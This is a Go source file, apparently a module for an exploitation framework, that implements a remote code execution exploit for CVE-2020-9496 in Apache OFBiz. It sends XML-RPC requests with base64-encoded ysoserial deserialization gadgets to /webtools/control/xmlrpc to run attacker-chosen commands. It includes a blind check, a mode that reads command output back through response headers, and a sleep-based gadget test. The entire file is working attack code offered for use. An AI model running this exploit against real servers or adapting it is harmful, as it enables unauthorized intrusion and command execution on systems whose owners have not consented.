package exp_OFBiz

import (
	"encoding/base64"
	"github.com/lz520520/railgunlib/pkg/gadgets"
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"strings"
	"time"
)

type Exp_CVE_2020_9496 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_CVE_2020_9496) Attack_check1() (expResult exp_model.ExpResult) {
	cmd := self.MustGetStringParam("cmd")
	headers := self.GetInitExpHeaders()
	headers.Set("Content-Type", "application/xml")
	payload := gadgets.YsoserialPayloadGenerator(self.MustGetStringParam("gadget"), cmd)
	params := `<?xml version="1.0"?>
<methodCall>
  <methodName>expmethodNam</methodName>
  <params>
    <param>
      <value>
        <struct>
          <member>
            <name>expname</name>
            <value>
              <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">
expserializable
</serializable>
            </value>
          </member>
        </struct>
      </value>
    </param>
  </params>
</methodCall>`
	params = strings.Replace(params, "expmethodNam", goutils.RandomHexString(8), 1)
	params = strings.Replace(params, "expname", goutils.RandomHexString(5), 1)
	params = strings.Replace(params, "expserializable", base64.StdEncoding.EncodeToString(payload), 1)
	httpresp := self.HttpPostWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/webtools/control/xmlrpc"), params, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	self.EchoSuccessMsg("无回显，自行检查")
	return
}

func (self *Exp_CVE_2020_9496) Attack_cmd1() (expResult exp_model.ExpResult) {
	cmd := self.MustGetStringParam("cmd")

	headers := self.GetInitExpHeaders()
	headers.Set("Content-Type", "application/xml")
	payload := gadgets.YsoserialPayloadGenerator(self.MustGetStringParam("gadget"), cmd)
	params := `<?xml version="1.0"?>
<methodCall>
  <methodName>expmethodNam</methodName>
  <params>
    <param>
      <value>
        <struct>
          <member>
            <name>expname</name>
            <value>
              <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">
expserializable
</serializable>
            </value>
          </member>
        </struct>
      </value>
    </param>
  </params>
</methodCall>`
	params = strings.Replace(params, "expmethodNam", goutils.RandomHexString(8), 1)
	params = strings.Replace(params, "expname", goutils.RandomHexString(5), 1)
	params = strings.Replace(params, "expserializable", base64.StdEncoding.EncodeToString(payload), 1)
	// cmd插入头部
	self.AddEncodeCmdHeader(headers, cmd)

	httpresp := self.HttpPostWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/webtools/control/xmlrpc"), params, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	self.EchoDebugMsg(httpresp.Resp.Header.Get("Transfer-encoded"))

	if self.CheckRespHeader(httpresp.Resp.Header) {
		self.EchoSuccessMsg("利用成功")
		// 解码响应数据
		result, err := self.ParserEncodeCmdResult(httpresp.Body)
		if err != nil {
			expResult.Err = err.Error()
			return
		}
		self.EchoSuccessMsg(result)
	} else {
		self.EchoErrMsg("利用失败")
	}

	return
}

func (self *Exp_CVE_2020_9496) subSleep() (err error) {
	headers := self.GetInitExpHeaders()
	headers.Set("Content-Type", "application/xml")
	payload := gadgets.YsoserialPayloadGenerator(self.MustGetStringParam("gadget"), "")
	params := `<?xml version="1.0"?>
<methodCall>
  <methodName>expmethodNam</methodName>
  <params>
    <param>
      <value>
        <struct>
          <member>
            <name>expname</name>
            <value>
              <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">
expserializable
</serializable>
            </value>
          </member>
        </struct>
      </value>
    </param>
  </params>
</methodCall>`
	params = strings.Replace(params, "expmethodNam", goutils.RandomHexString(8), 1)
	params = strings.Replace(params, "expname", goutils.RandomHexString(5), 1)
	params = strings.Replace(params, "expserializable", base64.StdEncoding.EncodeToString(payload), 1)

	httpresp := self.HttpPostWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/webtools/control/xmlrpc"), params, headers)
	if httpresp.Err != nil {
		err = httpresp.Err
		return
	}
	return
}

func (self *Exp_CVE_2020_9496) Attack_sleep1() (expResult exp_model.ExpResult) {
	self.CheckGagdetWithSleep(self.subSleep, 10*time.Second)
	return
}

func init() {

	exp_register.ExpStructRegister(&Exp_CVE_2020_9496{}, "exp_CVE_2020_9496.yml")

}
